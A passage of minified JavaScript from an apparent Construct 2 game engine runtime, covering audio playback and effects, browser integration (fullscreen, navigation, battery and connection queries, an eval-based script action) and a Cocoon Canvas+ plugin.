                if (c = this.getAudioInstance(m, u, f, 0 !== e, d)) c.setPannerEnabled(!0), c.setPan(n, r, s, o, a, E(h)), c.play(0 !== e, d, 0, this.nextPlayTime), this.nextPlayTime = 0;
                else this.getAudioBuffer(m, f).panWhenReady.push({
                    x: n,
                    y: r,
                    a: s,
                    ia: o,
                    oa: a,
                    og: E(h),
                    thistag: u
                })
            }
        }, pt.prototype.PlayAtObject = function (t, e, i, n, r, s, o, a) {
            if (!p && n) {
                var h = n.getFirstPicked();
                if (h) {
                    var u = E(i),
                        d = t[1],
                        g = this.runtime.files_subfolder + t[0] + (l ? ".ogg" : ".m4a");
                    if (c = this.getAudioInstance(g, a, d, 0 !== e, u)) {
                        c.setPannerEnabled(!0);
                        var y = cr.rotatePtAround(h.x, h.y, -h.layer.getAngle(), f, m, !0),
                            _ = cr.rotatePtAround(h.x, h.y, -h.layer.getAngle(), f, m, !1);
                        c.setPan(y, _, cr.to_degrees(h.angle - h.layer.getAngle()), r, s, E(o)), c.setObject(h), c.play(0 !== e, u, 0, this.nextPlayTime), this.nextPlayTime = 0
                    } else {
                        this.getAudioBuffer(g, d).panWhenReady.push({
                            obj: h,
                            ia: r,
                            oa: s,
                            og: E(o),
                            thistag: a
                        })
                    }
                }
            }
        }, pt.prototype.PlayByName = function (t, e, i, n, r) {
            if (!p) {
                var s = E(n),
                    o = 1 === t,
                    a = this.runtime.files_subfolder + e.toLowerCase() + (l ? ".ogg" : ".m4a");
                (c = this.getAudioInstance(a, r, o, 0 !== i, s)) && (c.setPannerEnabled(!1), c.play(0 !== i, s, 0, this.nextPlayTime), this.nextPlayTime = 0)
            }
        }, pt.prototype.PlayAtPositionByName = function (t, e, i, n, r, s, o, a, h, u, d) {
            if (!p) {
                var f = E(n),
                    m = 1 === t,
                    g = this.runtime.files_subfolder + e.toLowerCase() + (l ? ".ogg" : ".m4a");
                if (c = this.getAudioInstance(g, d, m, 0 !== i, f)) c.setPannerEnabled(!0), c.setPan(r, s, o, a, h, E(u)), c.play(0 !== i, f, 0, this.nextPlayTime), this.nextPlayTime = 0;
                else this.getAudioBuffer(g, m).panWhenReady.push({
                    x: r,
                    y: s,
                    a: o,
                    ia: a,
                    oa: h,
                    og: E(u),
                    thistag: d
                })
            }
        }, pt.prototype.PlayAtObjectByName = function (t, e, i, n, r, s, o, a, h) {
            if (!p && r) {
                var u = r.getFirstPicked();
                if (u) {
                    var d = E(n),
                        g = 1 === t,
                        y = this.runtime.files_subfolder + e.toLowerCase() + (l ? ".ogg" : ".m4a");
                    if (c = this.getAudioInstance(y, h, g, 0 !== i, d)) {
                        c.setPannerEnabled(!0);
                        var _ = cr.rotatePtAround(u.x, u.y, -u.layer.getAngle(), f, m, !0),
                            v = cr.rotatePtAround(u.x, u.y, -u.layer.getAngle(), f, m, !1);
                        c.setPan(_, v, cr.to_degrees(u.angle - u.layer.getAngle()), s, o, E(a)), c.setObject(u), c.play(0 !== i, d, 0, this.nextPlayTime), this.nextPlayTime = 0
                    } else {
                        this.getAudioBuffer(y, g).panWhenReady.push({
                            obj: u,
                            ia: s,
                            oa: o,
                            og: E(a),
                            thistag: h
                        })
                    }
                }
            }
        }, pt.prototype.SetLooping = function (t, e) {
            var i, n;
            for (ht(t), i = 0, n = ot.length; i < n; i++) ot[i].setLooping(0 === e)
        }, pt.prototype.SetMuted = function (t, e) {
            var i, n;
            for (ht(t), i = 0, n = ot.length; i < n; i++) ot[i].setMuted(0 === e)
        }, pt.prototype.SetVolume = function (t, e) {
            ht(t);
            var i, n, r = E(e);
            for (i = 0, n = ot.length; i < n; i++) ot[i].setVolume(r)
        }, pt.prototype.Preload = function (t) {
            if (!p) {
                var e = t[1],
                    i = this.runtime.files_subfolder + t[0] + (l ? ".ogg" : ".m4a");
                3 !== s ? 2 !== s && this.getAudioInstance(i, "<preload>", e, !1) : this.runtime.isDirectCanvas ? AppMobi.context.loadSound(i) : AppMobi.player.loadSound(i)
            }
        }, pt.prototype.PreloadByName = function (t, e) {
            if (!p) {
                var i = 1 === t,
                    n = this.runtime.files_subfolder + e.toLowerCase() + (l ? ".ogg" : ".m4a");
                3 !== s ? 2 !== s && this.getAudioInstance(n, "<preload>", i, !1) : this.runtime.isDirectCanvas ? AppMobi.context.loadSound(n) : AppMobi.player.loadSound(n)
            }
        }, pt.prototype.SetPlaybackRate = function (t, e) {
            var i, n;
            for (ht(t), e < 0 && (e = 0), i = 0, n = ot.length; i < n; i++) ot[i].setPlaybackRate(e)
        }, pt.prototype.Stop = function (t) {
            var e, i;
            for (ht(t), e = 0, i = ot.length; e < i; e++) ot[e].stop()
        }, pt.prototype.StopAll = function () {
            var t, e;
            for (t = 0, e = h.length; t < e; t++) h[t].stop()
        }, pt.prototype.SetPaused = function (t, e) {
            var i, n;
            for (ht(t), i = 0, n = ot.length; i < n; i++) 0 === e ? ot[i].pause() : ot[i].resume()
        }, pt.prototype.Seek = function (t, e) {
            var i, n;
            for (ht(t), i = 0, n = ot.length; i < n; i++) ot[i].seek(e)
        }, pt.prototype.SetSilent = function (t) {
            var e, i;
            if (2 === t && (t = p ? 1 : 0), 0 !== t || p) {
                if (1 === t && p) {
                    for (e = 0, i = h.length; e < i; e++) h[e].setSilent(!1);
                    p = !1
                }
            } else {
                for (e = 0, i = h.length; e < i; e++) h[e].setSilent(!0);
                p = !0
            }
        }, pt.prototype.SetMasterVolume = function (t) {
            var e, i;
            for (d = E(t), e = 0, i = h.length; e < i; e++) h[e].updateVolume()
        }, pt.prototype.AddFilterEffect = function (t, e, i, n, r, a, h) {
            1 !== s || e < 0 || e >= W.length || !o.createBiquadFilter || ((h /= 100) < 0 && (h = 0), h > 1 && (h = 1), lt(t = t.toLowerCase(), new U(e, i, n, r, a, h)))
        }, pt.prototype.AddDelayEffect = function (t, e, i, n) {
            1 === s && ((n /= 100) < 0 && (n = 0), n > 1 && (n = 1), lt(t = t.toLowerCase(), new V(e, E(i), n)))
        }, pt.prototype.AddFlangerEffect = function (t, e, i, n, r, a) {
            1 === s && o.createOscillator && ((a /= 100) < 0 && (a = 0), a > 1 && (a = 1), lt(t = t.toLowerCase(), new q(e / 1e3, i / 1e3, n, r / 100, a)))
        }, pt.prototype.AddPhaserEffect = function (t, e, i, n, r, a, h) {
            1 === s && o.createOscillator && ((h /= 100) < 0 && (h = 0), h > 1 && (h = 1), lt(t = t.toLowerCase(), new Y(e, i, n, r, a, h)))
        }, pt.prototype.AddConvolutionEffect = function (t, e, i, n) {
            if (1 === s && o.createConvolver) {
                var r, a = 0 === i,
                    h = this.runtime.files_subfolder + e[0] + (l ? ".ogg" : ".m4a"),
                    c = this.getAudioBuffer(h, !1);
                t = t.toLowerCase(), (n /= 100) < 0 && (n = 0), n > 1 && (n = 1), c.bufferObject ? r = new X(c.bufferObject, a, n, h) : (r = new X(null, a, n, h), c.normalizeWhenReady = a, c.convolveWhenReady = r), lt(t, r)
            }
        }, pt.prototype.AddGainEffect = function (t, e) {
            1 === s && lt(t = t.toLowerCase(), new H(E(e)))
        }, pt.prototype.AddMuteEffect = function (t) {
            1 === s && lt(t = t.toLowerCase(), new H(0))
        }, pt.prototype.AddTremoloEffect = function (t, e, i) {
            1 === s && o.createOscillator && ((i /= 100) < 0 && (i = 0), i > 1 && (i = 1), lt(t = t.toLowerCase(), new J(e, i)))
        }, pt.prototype.AddRingModEffect = function (t, e, i) {
            1 === s && o.createOscillator && ((i /= 100) < 0 && (i = 0), i > 1 && (i = 1), lt(t = t.toLowerCase(), new K(e, i)))
        }, pt.prototype.AddDistortionEffect = function (t, e, i, n, r, a) {
            1 === s && o.createWaveShaper && ((a /= 100) < 0 && (a = 0), a > 1 && (a = 1), lt(t = t.toLowerCase(), new Q(e, i, n, r, a)))
        }, pt.prototype.AddCompressorEffect = function (t, e, i, n, r, a) {
            1 === s && o.createDynamicsCompressor && lt(t = t.toLowerCase(), new Z(e, i, n, r / 1e3, a / 1e3))
        }, pt.prototype.AddAnalyserEffect = function (t, e, i) {
            1 === s && lt(t = t.toLowerCase(), new $(e, i))
        }, pt.prototype.RemoveEffects = function (t) {
            var e, i, n;
            if (1 === s && (t = t.toLowerCase(), M.hasOwnProperty(t) && (n = M[t]).length)) {
                for (e = 0, i = n.length; e < i; e++) n[e].remove();
                cr.clearArray(n), ct(t)
            }
        }, pt.prototype.SetEffectParameter = function (t, e, i, n, r, o) {
            var a;
            1 === s && (t = t.toLowerCase(), e = Math.floor(e), M.hasOwnProperty(t) && (a = M[t], e < 0 || e >= a.length || a[e].setParam(i, n, r, o)))
        }, pt.prototype.SetListenerObject = function (t) {
            if (t && 1 === s) {
                var e = t.getFirstPicked();
                e && (this.listenerTracker.setObject(e), f = e.x, m = e.y)
            }
        }, pt.prototype.SetListenerZ = function (t) {
            this.listenerZ = t
        }, pt.prototype.ScheduleNextPlay = function (t) {
            o && (this.nextPlayTime = t)
        }, pt.prototype.UnloadAudio = function (t) {
            var e = t[1],
                i = this.runtime.files_subfolder + t[0] + (l ? ".ogg" : ".m4a"),
                n = this.getAudioBuffer(i, e, !0);
            n && (n.release(), cr.arrayFindRemove(a, n))
        }, pt.prototype.UnloadAudioByName = function (t, e) {
            var i = 1 === t,
                n = this.runtime.files_subfolder + e.toLowerCase() + (l ? ".ogg" : ".m4a"),
                r = this.getAudioBuffer(n, i, !0);
            r && (r.release(), cr.arrayFindRemove(a, r))
        }, pt.prototype.UnloadAll = function () {
            var t, e;
            for (t = 0, e = a.length; t < e; ++t) a[t].release();
            cr.clearArray(a)
        }, t.acts = new pt, dt.prototype.Duration = function (t, e) {
            ht(e, !0), ot.length ? t.set_float(ot[0].getDuration()) : t.set_float(0)
        }, dt.prototype.PlaybackTime = function (t, e) {
            ht(e, !0), ot.length ? t.set_float(ot[0].getPlaybackTime(!0)) : t.set_float(0)
        }, dt.prototype.Volume = function (t, e) {
            if (ht(e, !0), ot.length) {
                var i = ot[0].getVolume();
                t.set_float(R(i))
            } else t.set_float(0)
        }, dt.prototype.MasterVolume = function (t) {
            t.set_float(R(d))
        }, dt.prototype.EffectCount = function (t, e) {
            e = e.toLowerCase();
            var i = null;
            M.hasOwnProperty(e) && (i = M[e]), t.set_int(i ? i.length : 0)
        }, dt.prototype.AnalyserFreqBinCount = function (t, e, i) {
            var n = ft(e = e.toLowerCase(), i = Math.floor(i));
            t.set_int(n ? n.node.frequencyBinCount : 0)
        }, dt.prototype.AnalyserFreqBinAt = function (t, e, i, n) {
            e = e.toLowerCase(), i = Math.floor(i), n = Math.floor(n);
            var r = ft(e, i);
            r ? n < 0 || n >= r.node.frequencyBinCount ? t.set_float(0) : t.set_float(r.freqBins[n]) : t.set_float(0)
        }, dt.prototype.AnalyserPeakLevel = function (t, e, i) {
            var n = ft(e = e.toLowerCase(), i = Math.floor(i));
            n ? t.set_float(n.peak) : t.set_float(0)
        }, dt.prototype.AnalyserRMSLevel = function (t, e, i) {
            var n = ft(e = e.toLowerCase(), i = Math.floor(i));
            n ? t.set_float(n.rms) : t.set_float(0)
        }, dt.prototype.SampleRate = function (t) {
            t.set_int(o ? o.sampleRate : 0)
        }, dt.prototype.CurrentTime = function (t) {
            t.set_float(o ? o.currentTime : cr.performance_now())
        }, t.exps = new dt
    }(), cr.plugins_.Browser = function (t) {
        this.runtime = t
    },
    function () {
        var pluginProto = cr.plugins_.Browser.prototype;
        pluginProto.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        };
        var typeProto = pluginProto.Type.prototype;
        typeProto.onCreate = function () {};
        var offlineScriptReady = !1,
            browserPluginReady = !1;
        document.addEventListener("DOMContentLoaded", (function () {
            if (window.C2_RegisterSW && navigator.serviceWorker) {
                var t = document.createElement("script");
                t.onload = function () {
                    offlineScriptReady = !0, checkReady()
                }, t.src = "offlineClient.js", document.head.appendChild(t)
            }
        }));
        var browserInstance = null;

        function checkReady() {
            offlineScriptReady && browserPluginReady && window.OfflineClientInfo && window.OfflineClientInfo.SetMessageCallback((function (t) {
                browserInstance.onSWMessage(t)
            }))
        }
        typeProto.onAppBegin = function () {
            browserPluginReady = !0, checkReady()
        }, pluginProto.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var instanceProto = pluginProto.Instance.prototype;
        instanceProto.onCreate = function () {
            var t = this;
            window.addEventListener("resize", (function () {
                t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnResize, t)
            })), browserInstance = this, void 0 !== navigator.onLine && (window.addEventListener("online", (function () {
                t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnOnline, t)
            })), window.addEventListener("offline", (function () {
                t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnOffline, t)
            }))), void 0 !== window.applicationCache && (window.applicationCache.addEventListener("updateready", (function () {
                t.runtime.loadingprogress = 1, t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnUpdateReady, t)
            })), window.applicationCache.addEventListener("progress", (function (e) {
                t.runtime.loadingprogress = e.loaded / e.total || 0
            }))), this.runtime.isDirectCanvas || (document.addEventListener("appMobi.device.update.available", (function () {
                t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnUpdateReady, t)
            })), document.addEventListener("backbutton", (function () {
                t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnBackButton, t)
            })), document.addEventListener("menubutton", (function () {
                t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnMenuButton, t)
            })), document.addEventListener("searchbutton", (function () {
                t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnSearchButton, t)
            })), document.addEventListener("tizenhwkey", (function (e) {
                switch (e.keyName) {
                    case "back":
                        t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnBackButton, t) || window.tizen && window.tizen.application.getCurrentApplication().exit();
                        break;
                    case "menu":
                        t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnMenuButton, t) || e.preventDefault();
                        break
                }
            }))), this.runtime.isWindows10 && "undefined" != typeof Windows ? Windows.UI.Core.SystemNavigationManager.getForCurrentView().addEventListener("backrequested", (function (e) {
                t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnBackButton, t) && (e.handled = !0)
            })) : this.runtime.isWinJS && WinJS.Application && (WinJS.Application.onbackclick = function (e) {
                return !!t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnBackButton, t)
            }), this.runtime.addSuspendCallback((function (e) {
                e ? t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnPageHidden, t) : t.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnPageVisible, t)
            })), this.is_arcade = void 0 !== window.is_scirra_arcade
        }, instanceProto.onSWMessage = function (t) {
            var e = t.data.type;
            "downloading-update" === e ? this.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnUpdateFound, this) : "update-ready" === e || "update-pending" === e ? this.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnUpdateReady, this) : "offline-ready" === e && this.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnOfflineReady, this)
        };
        var batteryManager = null,
            loadedBatteryManager = !1;

        function maybeLoadBatteryManager() {
            if (!loadedBatteryManager && navigator.getBattery) {
                var t = navigator.getBattery();
                loadedBatteryManager = !0, t && t.then((function (t) {
                    batteryManager = t
                }))
            }
        }

        function Cnds() {}

        function Acts() {}
        Cnds.prototype.CookiesEnabled = function () {
            return !!navigator && navigator.cookieEnabled
        }, Cnds.prototype.IsOnline = function () {
            return !!navigator && navigator.onLine
        }, Cnds.prototype.HasJava = function () {
            return !!navigator && navigator.javaEnabled()
        }, Cnds.prototype.OnOnline = function () {
            return !0
        }, Cnds.prototype.OnOffline = function () {
            return !0
        }, Cnds.prototype.IsDownloadingUpdate = function () {
            return void 0 !== window.applicationCache && window.applicationCache.status === window.applicationCache.DOWNLOADING
        }, Cnds.prototype.OnUpdateReady = function () {
            return !0
        }, Cnds.prototype.PageVisible = function () {
            return !this.runtime.isSuspended
        }, Cnds.prototype.OnPageVisible = function () {
            return !0
        }, Cnds.prototype.OnPageHidden = function () {
            return !0
        }, Cnds.prototype.OnResize = function () {
            return !0
        }, Cnds.prototype.IsFullscreen = function () {
            return !!(document.mozFullScreen || document.webkitIsFullScreen || document.fullScreen || this.runtime.isNodeFullscreen)
        }, Cnds.prototype.OnBackButton = function () {
            return !0
        }, Cnds.prototype.OnMenuButton = function () {
            return !0
        }, Cnds.prototype.OnSearchButton = function () {
            return !0
        }, Cnds.prototype.IsMetered = function () {
            var t = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return !!t && !!t.metered
        }, Cnds.prototype.IsCharging = function () {
            var t = navigator.battery || navigator.mozBattery || navigator.webkitBattery;
            return t ? !!t.charging : (maybeLoadBatteryManager(), !batteryManager || !!batteryManager.charging)
        }, Cnds.prototype.IsPortraitLandscape = function (t) {
            return (window.innerWidth <= window.innerHeight ? 0 : 1) === t
        }, Cnds.prototype.SupportsFullscreen = function () {
            if (this.runtime.isNodeWebkit) return !0;
            var t = this.runtime.canvasdiv || this.runtime.canvas;
            return !!(t.requestFullscreen || t.mozRequestFullScreen || t.msRequestFullscreen || t.webkitRequestFullScreen)
        }, Cnds.prototype.OnUpdateFound = function () {
            return !0
        }, Cnds.prototype.OnUpdateReady = function () {
            return !0
        }, Cnds.prototype.OnOfflineReady = function () {
            return !0
        }, pluginProto.cnds = new Cnds, Acts.prototype.Alert = function (t) {
            this.runtime.isDomFree || alert(t.toString())
        }, Acts.prototype.Close = function () {
            this.runtime.isCocoonJs ? CocoonJS.App.forceToFinish() : window.tizen ? window.tizen.application.getCurrentApplication().exit() : navigator.app && navigator.app.exitApp ? navigator.app.exitApp() : navigator.device && navigator.device.exitApp ? navigator.device.exitApp() : this.is_arcade || this.runtime.isDomFree || window.close()
        }, Acts.prototype.Focus = function () {
            this.runtime.isNodeWebkit ? window.nwgui.Window.get().focus() : this.is_arcade || this.runtime.isDomFree || window.focus()
        }, Acts.prototype.Blur = function () {
            this.runtime.isNodeWebkit ? window.nwgui.Window.get().blur() : this.is_arcade || this.runtime.isDomFree || window.blur()
        }, Acts.prototype.GoBack = function () {
            navigator.app && navigator.app.backHistory ? navigator.app.backHistory() : this.is_arcade || this.runtime.isDomFree || !window.back || window.back()
        }, Acts.prototype.GoForward = function () {
            this.is_arcade || this.runtime.isDomFree || !window.forward || window.forward()
        }, Acts.prototype.GoHome = function () {
            this.is_arcade || this.runtime.isDomFree || !window.home || window.home()
        }, Acts.prototype.GoToURL = function (t, e) {
            this.runtime.isCocoonJs ? CocoonJS.App.openURL(t) : this.runtime.isEjecta ? ejecta.openURL(t) : this.runtime.isWinJS ? Windows.System.Launcher.launchUriAsync(new Windows.Foundation.Uri(t)) : navigator.app && navigator.app.loadUrl ? navigator.app.loadUrl(t, {
                openExternal: !0
            }) : this.runtime.isCordova ? window.open(t, "_system") : this.is_arcade || this.runtime.isDomFree || (2 !== e || this.is_arcade ? 1 !== e || this.is_arcade ? window.location = t : window.parent.location = t : window.top.location = t)
        }, Acts.prototype.GoToURLWindow = function (t, e) {}, Acts.prototype.Reload = function () {
            this.is_arcade || this.runtime.isDomFree || window.location.reload()
        };
        var firstRequestFullscreen = !0,
            crruntime = null;

        function onFullscreenError(t) {
            console && console.warn, crruntime.setSize(window.innerWidth, window.innerHeight)
        }
        Acts.prototype.RequestFullScreen = function (t) {
            if (this.runtime.isDomFree) cr.logexport("[Construct 2] Requesting fullscreen is not supported on this platform - the request has been ignored");
            else if (t >= 2 && (t += 1), 6 === t && (t = 2), this.runtime.isNodeWebkit) this.runtime.isDebug ? debuggerFullscreen(!0) : !this.runtime.isNodeFullscreen && window.nwgui && (window.nwgui.Window.get().enterFullscreen(), this.runtime.isNodeFullscreen = !0, this.runtime.fullscreen_scaling = t >= 2 ? t : 0);
            else {
                if (document.mozFullScreen || document.webkitIsFullScreen || document.msFullscreenElement || document.fullScreen || document.fullScreenElement) return;
                this.runtime.fullscreen_scaling = t >= 2 ? t : 0;
                var e = document.documentElement;
                firstRequestFullscreen && (firstRequestFullscreen = !1, crruntime = this.runtime, e.addEventListener("mozfullscreenerror", onFullscreenError), e.addEventListener("webkitfullscreenerror", onFullscreenError), e.addEventListener("MSFullscreenError", onFullscreenError), e.addEventListener("fullscreenerror", onFullscreenError)), e.requestFullscreen ? e.requestFullscreen() : e.mozRequestFullScreen ? e.mozRequestFullScreen() : e.msRequestFullscreen ? e.msRequestFullscreen() : e.webkitRequestFullScreen && ("undefined" != typeof Element && void 0 !== Element.ALLOW_KEYBOARD_INPUT ? e.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT) : e.webkitRequestFullScreen())
            }
        }, Acts.prototype.CancelFullScreen = function () {
            this.runtime.isDomFree ? cr.logexport("[Construct 2] Exiting fullscreen is not supported on this platform - the request has been ignored") : this.runtime.isNodeWebkit ? this.runtime.isDebug ? debuggerFullscreen(!1) : this.runtime.isNodeFullscreen && window.nwgui && (window.nwgui.Window.get().leaveFullscreen(), this.runtime.isNodeFullscreen = !1) : document.exitFullscreen ? document.exitFullscreen() : document.mozCancelFullScreen ? document.mozCancelFullScreen() : document.msExitFullscreen ? document.msExitFullscreen() : document.webkitCancelFullScreen && document.webkitCancelFullScreen()
        }, Acts.prototype.Vibrate = function (t) {
            GC.vibrateShort();
        }, Acts.prototype.InvokeDownload = function (t, e) {
            var i = document.createElement("a");
            if (void 0 === i.download) window.open(t);
            else {
                var n = document.getElementsByTagName("body")[0];
                i.textContent = e, i.href = t, i.download = e, n.appendChild(i);
                var r = new MouseEvent("click");
                i.dispatchEvent(r), n.removeChild(i)
            }
        }, Acts.prototype.InvokeDownloadString = function (t, e, i) {
            var n = "data:" + e + "," + encodeURIComponent(t),
                r = document.createElement("a");
            if (void 0 === r.download) window.open(n);
            else {
                var s = document.getElementsByTagName("body")[0];
                r.textContent = i, r.href = n, r.download = i, s.appendChild(r);
                var o = new MouseEvent("click");
                r.dispatchEvent(o), s.removeChild(r)
            }
        }, Acts.prototype.ConsoleLog = function (t, e) {
            "undefined" != typeof console && (0 === t && console.log, 1 === t && console.warn, 2 === t && console.error)
        }, Acts.prototype.ConsoleGroup = function (t) {
            console && console.group
        }, Acts.prototype.ConsoleGroupEnd = function () {
            console && console.groupEnd
        }, Acts.prototype.ExecJs = function (js_) {
            try {
                eval && eval(js_)
            } catch (t) {
                console && console.error
            }
        };
        var orientations = ["portrait", "landscape", "portrait-primary", "portrait-secondary", "landscape-primary", "landscape-secondary"];

        function Exps() {}
        Acts.prototype.LockOrientation = function (t) {
            if (!((t = Math.floor(t)) < 0 || t >= orientations.length)) {
                this.runtime.autoLockOrientation = !1;
                var e = orientations[t];
                screen.orientation && screen.orientation.lock ? screen.orientation.lock(e) : screen.lockOrientation ? screen.lockOrientation(e) : screen.webkitLockOrientation ? screen.webkitLockOrientation(e) : screen.mozLockOrientation ? screen.mozLockOrientation(e) : screen.msLockOrientation && screen.msLockOrientation(e)
            }
        }, Acts.prototype.UnlockOrientation = function () {
            this.runtime.autoLockOrientation = !1, screen.orientation && screen.orientation.unlock ? screen.orientation.unlock() : screen.unlockOrientation ? screen.unlockOrientation() : screen.webkitUnlockOrientation ? screen.webkitUnlockOrientation() : screen.mozUnlockOrientation ? screen.mozUnlockOrientation() : screen.msUnlockOrientation && screen.msUnlockOrientation()
        }, pluginProto.acts = new Acts, Exps.prototype.URL = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : window.location.toString())
        }, Exps.prototype.Protocol = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : window.location.protocol)
        }, Exps.prototype.Domain = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : window.location.hostname)
        }, Exps.prototype.PathName = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : window.location.pathname)
        }, Exps.prototype.Hash = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : window.location.hash)
        }, Exps.prototype.Referrer = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : document.referrer)
        }, Exps.prototype.Title = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : document.title)
        }, Exps.prototype.Name = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : navigator.appName)
        }, Exps.prototype.Version = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : navigator.appVersion)
        }, Exps.prototype.Language = function (t) {
            navigator && navigator.language ? t.set_string(navigator.language) : t.set_string("")
        }, Exps.prototype.Platform = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : navigator.platform)
        }, Exps.prototype.Product = function (t) {
            navigator && navigator.product ? t.set_string(navigator.product) : t.set_string("")
        }, Exps.prototype.Vendor = function (t) {
            navigator && navigator.vendor ? t.set_string(navigator.vendor) : t.set_string("")
        }, Exps.prototype.UserAgent = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : navigator.userAgent)
        }, Exps.prototype.QueryString = function (t) {
            t.set_string(this.runtime.isDomFree ? "" : window.location.search)
        }, Exps.prototype.QueryParam = function (t, e) {
            if (this.runtime.isDomFree) t.set_string("");
            else {
                var i = RegExp("[?&]" + e + "=([^&]*)").exec(window.location.search);
                i ? t.set_string(decodeURIComponent(i[1].replace(/\+/g, " "))) : t.set_string("")
            }
        }, Exps.prototype.Bandwidth = function (t) {
            var e = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            e ? void 0 !== e.bandwidth ? t.set_float(e.bandwidth) : void 0 !== e.downlinkMax ? t.set_float(e.downlinkMax) : t.set_float(Number.POSITIVE_INFINITY) : t.set_float(Number.POSITIVE_INFINITY)
        }, Exps.prototype.ConnectionType = function (t) {
            var e = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            e ? t.set_string(e.type || "unknown") : t.set_string("unknown")
        }, Exps.prototype.BatteryLevel = function (t) {
            var e = navigator.battery || navigator.mozBattery || navigator.webkitBattery;
            e ? t.set_float(e.level) : (maybeLoadBatteryManager(), batteryManager ? t.set_float(batteryManager.level) : t.set_float(1))
        }, Exps.prototype.BatteryTimeLeft = function (t) {
            var e = navigator.battery || navigator.mozBattery || navigator.webkitBattery;
            e ? t.set_float(e.dischargingTime) : (maybeLoadBatteryManager(), batteryManager ? t.set_float(batteryManager.dischargingTime) : t.set_float(Number.POSITIVE_INFINITY))
        }, Exps.prototype.ExecJS = function (ret, js_) {
            if (eval) {
                var result = 0;
                try {
                    result = eval(js_)
                } catch (t) {
                    console && console.error
                }
                "number" == typeof result || "string" == typeof result ? ret.set_any(result) : "boolean" == typeof result ? ret.set_any(result ? 1 : 0) : ret.set_any(0)
            } else ret.set_any(0)
        }, Exps.prototype.ScreenWidth = function (t) {
            t.set_int(screen.width)
        }, Exps.prototype.ScreenHeight = function (t) {
            t.set_int(screen.height)
        }, Exps.prototype.DevicePixelRatio = function (t) {
            t.set_float(this.runtime.devicePixelRatio)
        }, Exps.prototype.WindowInnerWidth = function (t) {
            t.set_int(window.innerWidth)
        }, Exps.prototype.WindowInnerHeight = function (t) {
            t.set_int(window.innerHeight)
        }, Exps.prototype.WindowOuterWidth = function (t) {
            t.set_int(window.outerWidth)
        }, Exps.prototype.WindowOuterHeight = function (t) {
            t.set_int(window.outerHeight)
        }, pluginProto.exps = new Exps
    }(), cr.plugins_.Cocoon_Canvasplus = function (t) {
        this.runtime = t
    },
    function () {
        var t, e = "",
            i = "",
            n = "",
            r = "",
            s = "",
            o = cr.plugins_.Cocoon_Canvasplus.prototype;

        function a() {}

        function h() {}

        function c() {}
        o.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, o.Type.prototype.onCreate = function () {}, o.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        }, o.Instance.prototype.onCreate = function () {
            (this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof Cocoon && (t = this)
        }, a.prototype.isCanvasPlus = function () {
            return this.runtime.isCocoonJs
        }, a.prototype.onKeyboardCancel = function () {
            return !0
        }, a.prototype.onKeyboardSuccess = function () {
            return !0
        }, a.prototype.onConfirmCancel = function () {
            return !0
        }, a.prototype.onCaptureScreenAsyncFail = function () {
            return !0
        }, a.prototype.onConfirmSuccess = function () {
            return !0
        }, a.prototype.onCaptureScreenAsyncSuccess = function () {
            return !0
        }, o.cnds = new a, h.prototype.promptKeyboard = function (e, n, r, s, o, a) {
            if (this.runtime.isCocoonJs) {
                var h = ["text", "num", "phone", "email", "url"][s];
                Cocoon.Dialog.prompt({
                    title: e,
                    message: n,
                    text: r,
                    type: h,
                    cancelText: o,
                    confirmText: a
                }, {
                    success: function (e) {
                        i = e, t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onKeyboardSuccess, t)
                    },
                    cancel: function () {
                        t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onKeyboardCancel, t)
                    }
                })
            }
        }, h.prototype.confirmDialog = function (e, i, n, r) {
            this.runtime.isCocoonJs && Cocoon.Dialog.confirm({
                title: e,
                message: i,
                cancelText: n,
                confirmText: r
            }, (function (e) {
                e ? t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onConfirmSuccess, t) : t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onConfirmCancel, t)
            }))
        }, h.prototype.openURL = function (t) {
            Cocoon.App.openURL(t)
        }, h.prototype.exitApp = function () {
            Cocoon.App.exit()
        }, h.prototype.pauseApp = function () {
            Cocoon.App.pause()
        }, h.prototype.resumeApp = function () {
            Cocoon.App.resume()
        }, h.prototype.captureScreenSync = function (t, e, i) {
            if (this.runtime.isCocoonJs) {
                var r = ["APP_STORAGE", "INTERNAL_STORAGE", "EXTERNAL_STORAGE", "TEMPORARY_STORAGE"][e];
                n = Cocoon.Utils.captureScreen(t, r, i, !1)
            }
        }, h.prototype.captureScreenAsync = function (e, i, n) {
